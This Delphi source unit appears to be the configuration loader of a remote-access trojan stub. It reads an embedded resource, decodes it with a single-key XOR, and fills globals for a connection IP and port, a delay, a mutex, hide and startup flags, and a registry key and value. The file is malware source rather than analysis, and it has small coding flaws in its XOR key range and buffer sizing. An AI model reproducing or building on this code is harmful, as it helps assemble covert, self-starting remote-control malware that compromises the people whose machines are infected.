unit uConst;

interface

uses
  Windows, uString, uUtils;

var
  C_IP    :String;
  C_PORT  :Integer;
  C_DELAY :Integer;
  C_MUTEX :String;
  C_HIDE  :Integer;
  C_START :Integer;
  C_KEY   :String;
  C_VALUE :String;


procedure LoadConst;

implementation

function MakeXor(Buffer :String; Key :Integer) :String;
var
  i,c,x  :Integer;
begin
  for i := 1 to Length(Buffer) do
  begin
    c := Integer(Buffer[i]);
    x := c xor Key;
    Result := Result + Char(x);
  end;
end;

function ReadRes(TRes :LPTSTR; NameRes :String) :String;
var
  hRes    :THANDLE;
  hReturn :THANDLE;
  sRes    :DWORD;
  pRes    :PChar;
  Res     :String;
begin
  hRes := FindResource(0, PChar(NameRes), TRes);
  hReturn := LoadResource(0, hRes);
  sRes := SizeofResource(0, hRes);
  pRes := LockResource(hReturn);
  SetString(Res, pRes, sRes);
  Result := Res;
  FreeResource(hReturn);
end;

procedure LoadConst;
var
  Buffer :String;
  Parameters  :array[0..1024] of String;
begin
  Buffer := ReadRes(RT_RCDATA, 'I');
  Buffer := MakeXor(Buffer, 1337);
  FillChar(Parameters,SizeOf(Buffer),#0);
  SplitString(PChar(Buffer), Parameters);

  C_IP    := Parameters[0];
  C_PORT  := StrToInt(Parameters[1]);
  C_DELAY := StrToInt(Parameters[2]);
  C_MUTEX := Parameters[3];
  C_HIDE  := StrToInt(Parameters[4]);
  C_START := StrToInt(Parameters[5]);
  C_KEY   := Parameters[6];
  C_VALUE := Parameters[7];
end;

end.
